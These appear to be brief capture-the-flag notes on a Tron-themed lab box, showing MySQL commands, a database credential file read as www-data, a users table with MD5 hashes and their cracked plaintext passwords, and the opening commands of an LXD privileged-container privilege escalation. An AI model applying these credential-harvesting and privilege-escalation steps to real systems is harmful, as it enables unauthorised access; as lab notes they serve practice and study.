# COMMANDS

##MYSQL
	-`show databases|tables;`
	-`use <DATABASE>;`

# INFO

Apache/2.4.29 
Ubuntu

# CREDS
```
www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
<?php
	$dbaddr = "localhost";
	$dbuser = "tron";
	$dbpass = "IFightForTheUsers";
	$database = "tron";

	$dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);
	if($dbh->connect_error){
		die($dbh->connect_error);
	}
?>
```

```
mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
|  2 | test     | 098f6bcd4621d373cade4e832627b4f6 |
+----+----------+----------------------------------+
2 rows in set (0.00 sec)
```
```
+----+----------+----------------------------------+-----------+
| id | username | password(hash)	               |password   |
+----+----------+----------------------------------+-----------+
|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |@computer@ |
|  2 | test     | 098f6bcd4621d373cade4e832627b4f6 |test       |
+----+----------+----------------------------------+-----------+
```

# LXD privesc
```
lxc image list
lxc init Alpine StrongBad -c security.privileged
```